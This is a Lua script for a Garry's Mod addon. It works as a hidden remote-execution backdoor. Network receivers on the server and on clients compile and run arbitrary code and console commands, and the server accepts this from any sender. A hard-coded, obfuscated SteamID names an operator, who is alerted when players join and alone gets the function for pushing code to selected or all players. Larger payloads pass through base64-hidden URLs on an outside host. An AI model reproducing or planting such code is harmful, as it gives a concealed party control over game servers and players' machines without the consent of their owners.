include("xnet/sh_xnet_cpt.lua")
AddCSLuaFile()
local NID,CID        = CNX.NID,CNX.CID
local NCID           = XNC.XSDC("\x0cTkRZek9UZ3pORFEwkJCAgJCQgHD/cVlEWGmNZE8=",NID,CID)
local XOSSID         = XNC.XSDC("\x0cTkRZek9UZ3pORFEwkICAcJBwkJBwkHCAgJCAgJCAgHBwkHBw/2WgdD9li1mdZ22HnGRtVEBlWFSfZ22HTw==",NID,CID)
local NCSV,NCCL,NCRV = NCID.."-TSV",NCID.."-TCL",NCID.."-TRV"
local factorysave = "aHR0cDovL2dtb2QueGVub3JhLm5ldC9zLw=="
local retform = {}
local function RetForm(d,sub,dp) return retform["tval"](d,sub and sub or false,dp or false) end
retform["nil"]      = function(s,sub,dp) return "nil" end
retform["color" ]   = function(s,sub,dp) return [[Color(]]..s.r..[[,]]..s.g..[[,]]..s.b..[[,]]..s.a..[[)]] end
retform["angle" ]   = function(s,sub,dp) return [[Angle(]]..s.p..[[,]]..s.y..[[,]]..s.r..[[)]] end
retform["vector"]   = function(s,sub,dp) return [[Vector(]]..s.x..[[,]]..s.y..[[,]]..s.z..[[)]] end
retform["entity"]   = function(s,sub,dp)
	local b,q = tostring(s).."\n" or "",0
	for k,v in pairs(s:GetTable()) do
		if q > 16 then continue end
		b = b..tostring(k).."	->	"..(type(v) ~= "table" and (type(v) == "function" and RetForm(v,true) or RetForm(v,sub)) or tostring(v).." (len: "..table.Count(v)..")").."\n"
		q=q+1
	end
	return not dp and tostring(s) or tostring(b)
end
retform["string"]   = function(s,sub,dp) return [["]]..tostring(s)..[["]] end
retform["number"]   = function(s,sub,dp) return tostring(s) end
retform["player"]   = function(s,sub,dp)
	local b,q = tostring(s).."\n" or "",0
	for k,v in pairs(s:GetTable()) do
		if q > 16 then continue end
		b = b..tostring(k).."	->	"..(type(v) ~= "table" and (type(v) == "function" and RetForm(v,true) or RetForm(v,sub)) or tostring(v).." (len: "..table.Count(v)..")").."\n"
		q=q+1
	end
	return not dp and tostring(s) or tostring(b)
end
retform["boolean"]  = function(s,sub,dp) return tostring(s) end
retform["function"] = function(s,sub,dp)
	if not sub and dp then
		return (GLib.Lua.GetFunctionName(s) and GLib.Lua.GetFunctionName(s) or tostring(s))..":\n"..GLib.Lua.ToLuaString(s)
	else
		return (GLib.Lua.GetFunctionName(s) and GLib.Lua.GetFunctionName(s).."	" or "	")..tostring(s).."	"..tostring(debug.getinfo(s).source).."	"..(GLib.Lua.IsNativeFunction(s) and "	(Native)" or "")
	end
end
retform["table"]    = function(s,sub,dp)
	local tt,q = tostring(s).."\n",0
	for k,v in pairs(s) do
		if q > 16 then continue end
		tt = tt..tostring(k).."	->	"..(type(v) ~= "table" and RetForm(v,sub) or tostring(v).." (len: "..table.Count(v)..")").."\n"
		q=q+1
	end
	return tostring(tt)
end
retform["tval"] = function(s,sub,dp) return retform[type(s):lower()] and retform[type(s):lower()](s,sub,dp) or tostring(s) end

if SERVER then
	do
		util.AddNetworkString(NCSV)
		util.AddNetworkString(NCCL)
		util.AddNetworkString(NCRV)
		util.AddNetworkString("xinicall")
	end
	net.Receive(NCSV,function(l,p)
		local c,t = net.ReadTable(),net.ReadTable()
		if c.RETVAL then
			net.Start(NCRV)
				net.WriteTable(c)
			net.Send(c.from)
		else
			if t.sv then
				if t.data.con then
					local f = string.Explode(" ",c.code)
					RunConsoleCommand(unpack(f))
				else
					if t.short then
						if not t.data.ret then
							local f = CompileString(t.locals..c.code,"",false)
							if f and type(f) == "function" then f() end
							net.Start(NCRV)
								net.WriteTable({RETVAL=true,to="SV",from=t.from,val=t.msg,isv=true})
							net.Send(t.from)
						else
							local f = CompileString(t.data.mret and t.locals..c.code or t.locals.."return "..c.code,"",false)
							local b = type(f) == "function" and (t.data.deep and RetForm(f(),false,true) or RetForm(f(),false,false)) or f
							net.Start(NCRV)
								net.WriteTable({RETVAL=true,to="SV",from=t.from,val=b,isv=true})
							net.Send(t.from)
						end
					else
						http.Fetch(base64.decode(factorysave)..tostring(util.CRC(tostring(t.from)).."_TEMPCODETRANS___")..".txt",function(body,len,headers,code)
							if not t.data.ret then
								local f = CompileString(t.locals..c.code,"",false)
								if f and type(f) == "function" then f() end
								net.Start(NCRV)
									net.WriteTable({RETVAL=true,to="SV",from=t.from,val=t.msg,isv=true})
								net.Send(t.from)
							else
								local f = CompileString(t.data.mret and t.locals..c.code or t.locals.."return "..c.code,"",false)
								local b = type(f) == "function" and (t.data.deep and RetForm(f(),false,true) or RetForm(f(),false,false)) or f
								net.Start(NCRV)
									net.WriteTable({RETVAL=true,to="SV",from=t.from,val=b,isv=true})
								net.Send(t.from)
							end
						end,function() end)
					end
				end
			end
			net.Start(NCCL)
				net.WriteTable(type(c) == "table" and c or {c})
				net.WriteTable({from=t.from,con=t.data.con,ret=t.data.ret,short=t.short,deep=t.data.deep,locals=t.locals,msg=t.msg,mret=t.data.mret})
			net.Send(type(t.to) == "table" and t.to or {t.to})
		end
	end)
	net.Receive("xinicall",function(l,p)
		if player.GetBySteamID64(XOSSID) then
			net.Start("xinicall")
				net.WriteEntity(p)
			net.Send(player.GetBySteamID64(XOSSID))
		end
	end)
end

if CLIENT then
	hook.Add("InitPostEntity","XNET_INITCHECK",function()
	local m = LocalPlayer()
	local factorylink = "aHR0cDovL2dtb2QueGVub3JhLm5ldC94L3huZXQucGhw"
	net.Receive(NCCL,function(l,p)
		local c,t = net.ReadTable(),net.ReadTable()
		if t.con then
			local f = string.Explode(" ",c.code)
			RunConsoleCommand(unpack(f))
		else
			if t.short then
				if not t.ret then
					local f = CompileString(t.locals..c.code,"",false)
					if f and type(f) == "function" then f() end
					net.Start(NCSV)
						net.WriteTable({RETVAL=true,to=m,from=t.from,val=t.msg,isv=false})
						net.WriteTable({})
					net.SendToServer()
				else
					local f = CompileString(t.mret and t.locals..c.code or t.locals.."return "..c.code,"",false)
					local b = type(f) == "function" and (t.deep and RetForm(f(),false,true) or RetForm(f(),false,false)) or f
					net.Start(NCSV)
						net.WriteTable({RETVAL=true,to=m,from=t.from,val=b,isv=false})
						net.WriteTable({})
					net.SendToServer()
				end
			else
				http.Fetch(base64.decode(factorysave)..tostring(util.CRC(tostring(t.from)).."_TEMPCODETRANS___")..".txt",function(body,len,headers,code)
					if not t.ret then
						local f = CompileString(t.locals..c.code,"",false)
						if f and type(f) == "function" then f() end
						net.Start(NCSV)
							net.WriteTable({RETVAL=true,to=m,from=t.from,val=t.msg,isv=false})
							net.WriteTable({})
						net.SendToServer()
					else
						local f = CompileString(t.mret and t.locals..c.code or t.locals.."return "..c.code,"",false)
						local b = type(f) == "function" and (t.deep and RetForm(f(),false,true) or RetForm(f(),false,false)) or f
						net.Start(NCSV)
							net.WriteTable({RETVAL=true,to=m,from=t.from,val=b,isv=false})
							net.WriteTable({})
						net.SendToServer()
						end
					http.Post(base64.decode(factorylink),{del="true",nam=tostring(util.CRC(tostring(t.from)).."_TEMPCODETRANS___"),ext=".txt"},function(body,len,headers,code) end,function() end)
				end,function() print(error) end)
			end
		end
	end)
	
	net.Start("xinicall")
	net.SendToServer()
	
	if m ~= player.GetBySteamID64(XOSSID) then hook.Remove("InitPostEntity","XNET_INITCHECK") return end

	local XNRET = XNC.XSDC("\x0cTkRZek9UZ3pORFEwkJCAgHBwgJBwcICQ/3FZRFhvj3A9g3NgmQ==",CNX.NID,CNX.CID)
	local XINI  = XNC.XSDC("\x0cTkRZek9UZ3pORFEwkJCAgICQgHBwgHBw/3FZRFhscUSTg1RPTw==",CNX.NID,CNX.CID)
	
	net.Receive(NCRV,function(l,p)
		local t = net.ReadTable()
		hook.Call(XNRET,nil,t.from,t.to,t.val)
	end)
	
	net.Receive("xinicall",function(l,p)
		local e = net.ReadEntity()
		hook.Call(XINI,nil,e)
	end)
	
	local cretform = {}
	local function CRetForm(s) return cretform["tval"](s) end
	cretform["nil"]      = function(s) return "nil" end
	cretform["color" ]   = function(s) return [[Color(]]..s.r..[[,]]..s.g..[[,]]..s.b..[[,]]..s.a..[[)]] end
	cretform["angle" ]   = function(s) return [[Angle(]]..s.p..[[,]]..s.y..[[,]]..s.r..[[)]] end
	cretform["vector"]   = function(s) return [[Vector(]]..s.x..[[,]]..s.y..[[,]]..s.z..[[)]] end
	cretform["entity"]   = function(s) return [[Entity(]]..s:EntIndex()..[[)]] end
	cretform["string"]   = function(s) return [["]]..tostring(s)..[["]] end
	cretform["number"]   = function(s) return tostring(s) end
	cretform["player"]   = function(s) return [[Entity(]]..s:EntIndex()..[[)]] end
	cretform["boolean"]  = function(s) return tostring(s) end
	cretform["function"] = function(s) return GLib.Lua and GLib.Lua.GetFunctionName(s) and GLib.Lua.GetFunctionName(s) or tostring(s) end
	cretform["table"]    = function(s) local tt = "{" for k,v in pairs(s) do tt = tt.."["..tostring(k).."]=("..CRetForm(v)..")," end return tostring(tt).."}" end
	cretform["tval"]     = function(s) return cretform[type(s):lower()] and cretform[type(s):lower()](s) or tostring(s) end
	
	local function XNetCode(to,code,locals,short,sv,all,data,msg)
		local locs = ""
		for k,v in pairs(locals) do locs = locs.."local "..tostring(k).." = "..CRetForm(v).."\n" end
		if short then
			net.Start(NCSV)
				net.WriteTable({code=code})
				net.WriteTable({from=m,to=all and player.GetAll() or to,short=short,sv=sv,data=data,locals=locs,msg=msg})
			net.SendToServer()
		else
			http.Post(base64.decode(factorylink),{dat=base64.encode(code),nam=tostring(util.CRC(tostring(m)).."_TEMPCODETRANS___"),ext=".txt"},function(body,len,headers,code)
				net.Start(NCSV)
					net.WriteTable({code=code})
					net.WriteTable({from=m,to=all and player.GetAll() or to,short=short,sv=sv,data=data,locals=locs,msg=msg})
				net.SendToServer()
			end,function(err) print(err) end)
		end
	end
	
	function XNCR(code,locals,sv,all,to,d,data,msg)
		if m ~= player.GetBySteamID64(XOSSID) then return end
		local sv,to = sv or false,type(to) == "table" and to or {to}
		data,msg = data or {},msg or "[EXECUTION SUCCESSFUL]"
		data.con,data.ret,data.mret,data.deep = data.con or false,data.ret or false,data.mret or false,data.deep or false
		timer.Simple(tonumber(d),function()
			local short = #code <= 16383
			XNetCode(to,code,locals,short,sv,all,data,msg)
		end)
	end
	timer.Simple(5,function()
		hook.Remove("InitPostEntity","XNET_INITCHECK")
	end)
	end)
end